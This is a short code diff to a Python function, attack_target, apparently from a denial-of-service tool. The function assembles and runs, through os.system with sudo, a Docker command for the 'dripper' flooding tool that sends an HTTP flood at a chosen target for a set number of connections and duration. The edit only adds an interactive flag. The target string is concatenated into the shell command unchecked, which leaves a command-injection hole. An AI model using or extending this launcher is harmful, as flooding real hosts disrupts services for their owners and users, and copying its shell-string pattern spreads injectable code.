@@ -117,7 +117,7 @@ def attack_target(target, port, connections, duration, protocol):
     elif protocol == 'HTTPS':
         full_target = 'https://' + target + ' -m http-flood'
         
-    exe_command='sudo docker run --rm alexmon1989/dripper:latest -s ' + full_target + ' -t ' + str(connections) + ' -d ' + str(duration)
+    exe_command='sudo docker run -i --rm alexmon1989/dripper:latest -s ' + full_target + ' -t ' + str(connections) + ' -d ' + str(duration)
     print('Start command:', exe_command)
     os.system(exe_command)
 
